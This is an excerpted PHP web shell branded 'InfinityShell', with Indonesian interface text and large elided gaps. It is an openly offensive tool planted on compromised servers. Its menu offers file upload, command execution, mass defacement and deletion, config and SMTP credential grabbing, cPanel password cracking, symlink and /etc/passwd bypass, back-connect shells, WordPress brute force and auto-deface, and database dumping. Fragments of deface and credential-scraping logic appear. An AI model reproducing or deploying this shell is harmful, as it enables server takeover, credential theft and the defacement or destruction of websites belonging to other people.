...
error_reporting(0);
set_time_limit(0);
$auth_pass = "e973fa460487a7103cce323e0226bd72"; ////////pass InfinityCyber 
...
<html>
<head>
<title>@InfinityShell</title>
<link href='https://scontent.fbdo1-1.fna.fbcdn.net/v/t1.0-9/fr/cp0/e15/q65/40133573_308652726558399_1862966829421428736_n.jpg?_nc_cat=0&efg=eyJpIjoidCJ9&oh=2b146a8d54940a3603a3fa63b6cec5d1&oe=5C00E123' rel='icon' type='image/x-icon'/>
...
<br>
          <p><img style="width:290px;" src="https://2.bp.blogspot.com/-nsKvRNCijA8/W50ocPsfuWI/AAAAAAAAAY4/9EAi41e-1hQbeVJJX7jU5HL9fVMb2-27gCLcBGAs/s1600/Infinity%2BCyber%2BTeam%2B%255BOfficial%255D%2B20180915_224137.jpg" border="0"></p>
   <br>      <font color="red" face="iceland" size="8"><b>Infinity<font color="white">Shell<font color="blue"></font></b><br>
<form method="post">
...
echo "Komputer: <font color=lime>".$kernel."</font><br>";
echo "Pengguna: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")<br>";
echo "Jaringan Anda: <font color=lime>".$ip."</font> | Ip Anda: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "Hardisk: <font color=lime>$used</font> / <font color=lime>$total</font> ( Bebas: <font color=lime>$freespace</font> )<br>";
echo "Mode Penyelamat: $sm<br>";
echo "Function dimatikan: $show_ds<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
echo "<hr>";
echo "<center>";
echo "<br><link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'><font face='iceland'size='7' color='red'>@InfinityShell</font><font face='iceland' size='7' color='white'></font>";
echo "<ul><font face='iceland' size='3.8' color='red'>";

echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?'>Home</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=upload'>Upload</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=cmd'>Command</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=mass_deface'>Mass Deface</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=mass_delete'>Mass Delete</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=config'>Config</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=jumping'>Jumping</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=cpanel'>CPanel Crack</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=smtp'>SMTP Grabber</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=zoneh'>Zone-H</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=cgi'>CGI Telnet</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=network'>network</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=adminer'>Adminer</a> </li>";
echo "<p>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=fake_root'>Fake Root</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=auto_wp'>Auto Edit Title WordPress</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=auto_dwp'>WordPress Auto Deface</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=auto_dwp2'>WordPress Auto Deface V.2</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=cpftp_auto'>CPanel/FTP Auto Deface</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a> </li>";
echo "<p>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=defacerid'>DefacerID</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=csrf'>CSRF Online</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=backconnect'>Back Connect</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=wpbf'>WordPress Brute</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=hashid'>Hash Identification</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=symlink'>Symlink</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=passwbypass'>Bypass Etc/Passw</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=dbdump'>DB Dump</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?do=decode'>Decode Text</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?do=shelscan'>Finder Shell</a> </li>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?do=encode'>Encode Text</a> </li>";
echo "<p>";
echo "<li> <a style='border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;' href='?do=md5'>MD5</a> </li>";
...
switch ($op){
 ...
 elseif($_GET['do'] == 'upload') {
    ...
    <textarea name='script' style='width: 450px; height: 200px;'>Hacked By? T14RB373T</textarea><br>
    ...
    if(preg_match("/hsphere/", $dir)) {
                ...
                foreach($user_jumping[1] as $user_idx_jump) {
                    ...
                    if(is_readable($user_jumping_dir)) {
                        ...
                        if(function_exists('posix_getpwuid')) {
                            ...
                            if($domain_jump == '') {
                                echo " => ( <font color=red>Domen Mahal Gan Jadi Gabisa Ambil:'(</font> )<br>";
                            } else {
        ...
        if($i == 0) {
            ...
            echo "<br>Ada  ".$i." Lonte Di Hotel".$ip;
        }
        echo "</pre>";
    }
    echo "</div>";
        ...
        if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
            ...
            foreach($scan_conf as $file_conf) {
                ...
                if(preg_match("/JConfig|joomla/",$config)) {
                    ...
                    echo "CMS => Joomla<br>";
                    if($site == '') {
                        echo "Sitename => <font color=red>Gagal TAI:'(</font><br>";
                    } else {
    ...
    if($_POST['crack']) {
        ...
        if($i == 0) {
            ...
            echo "<br>Nyolong Trus Ajg >;( Mayan Dapet ".$i." Cpanel 1 Cpanel 1$ :v<font color=blue>Bagi 1 Ajg :v</font>";
        }
    } else {
        echo "<center>
        <form method='post'>
...
elseif($_GET['do'] == 'cgi') {
    ...
    echo "<center>&copy; ".date("Y")." - <font color=dimgray></font></a></center>";
}
?>
</html>